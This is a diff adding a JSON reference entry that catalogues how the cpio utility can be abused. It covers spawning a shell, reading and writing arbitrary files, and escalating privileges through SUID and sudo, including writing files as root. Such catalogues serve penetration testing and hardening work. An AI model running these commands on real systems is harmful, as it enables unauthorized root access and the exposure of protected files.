@@ -1,0 +1,48 @@
+{
+  "functions": {
+    "shell": [
+      {
+        "code": "echo '/bin/sh </dev/tty >/dev/tty' >localhost\ncpio -o --rsh-command /bin/sh -F localhost:\n"
+      }
+    ],
+    "file-read": [
+      {
+        "description": "The content of the file is printed to standard output, between the cpio archive format header and footer.",
+        "code": "echo \"[file]\" | cpio -o\n"
+      },
+      {
+        "description": "The whole directory structure is copied to '$TF'.",
+        "code": "TF=$(mktemp -d)\necho \"[file]\" | cpio -dp $TF\ncat \"$TF/[file]\"\n"
+      }
+    ],
+    "file-write": [
+      {
+        "description": "Copies the file to the dir directory.",
+        "code": "echo [data] >[file]\necho [file] | cpio -up [dir]\n"
+      }
+    ],
+    "suid": [
+      {
+        "description": "The whole directory structure is copied to '$TF'.",
+        "code": "TF=$(mktemp -d)\necho \"[file]\" | ./cpio -R $UID -dp $TF\ncat \"$TF/[file]\"\n"
+      },
+      {
+        "description": "Copies `$LFILE` to the `$LDIR` directory.",
+        "code": "echo [data] >[file]\necho [file] | ./cpio -R 0:0 -p [dir]\n"
+      }
+    ],
+    "sudo": [
+      {
+        "code": "echo '/bin/sh </dev/tty >/dev/tty' >localhost\nsudo cpio -o --rsh-command /bin/sh -F localhost:\n"
+      },
+      {
+        "description": "The whole directory structure is copied to '$TF'.",
+        "code": "TF=$(mktemp -d)\necho \"[file]\" | sudo cpio -R $UID -dp $TF\ncat \"$TF/[file]\"\n"
+      },
+      {
+        "description": "Copies the file to the dir directory.",
+        "code": "echo [data] >[file]\necho [file] | sudo cpio -R 0:0 -p [dir]\n"
+      }
+    ]
+  }
+}
